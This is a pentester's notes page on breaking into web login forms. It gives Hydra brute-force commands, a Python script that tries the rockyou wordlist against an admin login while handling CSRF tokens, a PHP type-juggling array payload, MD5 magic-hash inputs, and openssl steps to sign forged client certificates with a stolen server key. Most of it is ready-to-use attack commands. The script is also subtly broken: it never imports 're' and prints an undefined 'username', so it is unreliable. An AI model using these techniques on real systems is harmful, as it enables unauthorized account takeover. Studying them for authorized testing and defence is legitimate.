---
description: >-
  We can find some login panes that we want to bypass or bruteforce. Here you
  can find some amazing tricks.
---

# Login Panes

## Bruteforce it!

### Hydra

hydra is a powerful network service attack tool that attacks a variety of protocol authentication schemes, including SSH and HTTP.

#### POST Forms

```text
hydra <ip-addr> -l user -P passwords.txt -s <port> -vV -f http-form-post "/index.php:user=^USER^&password=^PASS^:Invalid Credentials"

-l user
-L user wordlist
-p password
-P password wordlist
```

### Basic Auth

```text
hydra <ip-addr> -l user -P passwords.txt -s <port> -vV -f http-get /index.php
```

### My own script

I made my own script in order to bruteforce some login panes with CSRF protection. I think is a good alternative to the Burpsuite  **Pitchfork attack.**

```text
#!/usr/bin/env python3

import sys, os, requests, codecs

s = requests.Session()

# Get CRSF TOKEN
resp = s.get("https://WEBPAGE.LOCAL/", verify=False)
regex = '<input type="hidden" name="csrf" value="(.*)"'
token = re.search(regex,resp.text).group(1)

with codecs.open("/usr/share/wordlists/rockyou.txt", 'r', encoding='utf-8', errors='ignore') as wordlist:
	dic = wordlist.read().splitlines()
	for pwd in dic:

		#Bruteforce
		data_post = {
			"csrf" : token,
			"username" : "admin",
			"password" : pwd,
		}
		print("[!] Trying: " + pwd)
		resp2 = s.post("https://WEBPAGE.LOCAL/login", json=data_post, verify=False)
		if "permission_denied" not in resp2.text:
			print("Username = " + username + "Password = " + pwd)
			sys.exit(0)	
```

## Bypass it!

The are very different methods to bypass a login pane, this are the most common ones.

### SQLi

There are more info to bypass login panes with SQL Injections in:

{% page-ref page="sqli.md" %}

### PHP Type Juggling \(==\)

How PHP’s type comparison features lead to vulnerabilities and in that case to bypass the login. Loose comparisons \(==\)  have a set of operand conversion rules to make it easier for developers. 

Let's check the differences between Strict comparisons \(===\) and Loose comparisons \(==\).

![PHP Strict comparison](../.gitbook/assets/2021-02-18_212144.png)

![PHP Loose comparison](../.gitbook/assets/image%20%286%29.png)

When we find some code like this:

```text
if($_POST['password'] == "secretpass")
```

Instead of send a string we send an array we will bypass the login:

```text
username=admin&password[]=
```

{% embed url="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf" %}

#### Magic Hashes

This particular implication for password hashes wen the operator equals-equals\(==\) is used. The problem is in == comparison, the 0e means that if the following characters are all digits the whole string gets treated as a float. Below is a list of hash types that when hashed are ^0+ed\*$ which equates to zero in PHP when magic hashes typing using the “==” operator is applied. That means that when a password hash starts with “0e…” as an example it will always appear to match the below strings, regardless of what they actually are if all of the subsequent characters are digits from “0-9”.

```text
# MD5
240610708 - 0e462097431906509019562988736854
QNKCDZO   - 0e830400451993494058024219903391
aabg7XSs  - 0e087386482136013740957780965295
```

{% embed url="https://www.whitehatsec.com/blog/magic-hashes/" %}

## Client Certificates

 **SSL/TLS** certificates are commonly used for both encryption and identification of the parties, sometimes this is used instead of credentials at login.

### Setting up the private key and the certificate \(Server\)

 First of all, we need to generate our keys and certificates. We use the `openssl` command-line tool.

```text
openssl req -x509 -newkey rsa:4096 -keyout server_key.pem -out server_cert.pem -nodes -days 365 -subj "/CN=localhost/O=Client\ Certificate\ Demo"
```

### Setting up client certificates

To create a key and a Certificate Signing Request for Alice and Bob we can use the following command:

```text
openssl req -newkey rsa:4096 -keyout alice_key.pem -out alice_csr.pem -nodes -days 365 -subj "/CN=Alice"
openssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj "/CN=Bob"
```

#### Server Signed Certificate:

```text
openssl x509 -req -in alice_csr.pem -CA server_cert.pem -CAkey server_key.pem -out alice_cert.pem -set_serial 01 -days 365
```

Maybe during the pentest we found the server key, remember that **we can download the server certificate** with the browser.

![](../.gitbook/assets/cert.png)

#### Self-Signed Certificate:

```text
openssl x509 -req -in bob_csr.pem -signkey bob_key.pem -out bob_cert.pem -days 365
```

### Trying to get in

To use these certificates in our browser or via curl, we need to bundle them in PKCS\#12 format.

```text
openssl pkcs12 -export -clcerts -in alice_cert.pem -inkey alice_key.pem -out alice.p12
openssl pkcs12 -export -in bob_cert.pem -inkey bob_key.pem -out bob.p12
```

#### Via Browser

`Settings -> Privacy & Security -> Security -> Certificates -> View Certificates... -> Your Certificates -> Import`

![](../.gitbook/assets/importcert.png)

#### Via Curl

```text
curl --insecure --cert mvc1009.p12 --cert-type p12 https://localhost:443/
```

{% embed url="https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326" %}



## References:

* [https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/](https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/)
* [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)
* [https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp)
* [https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)



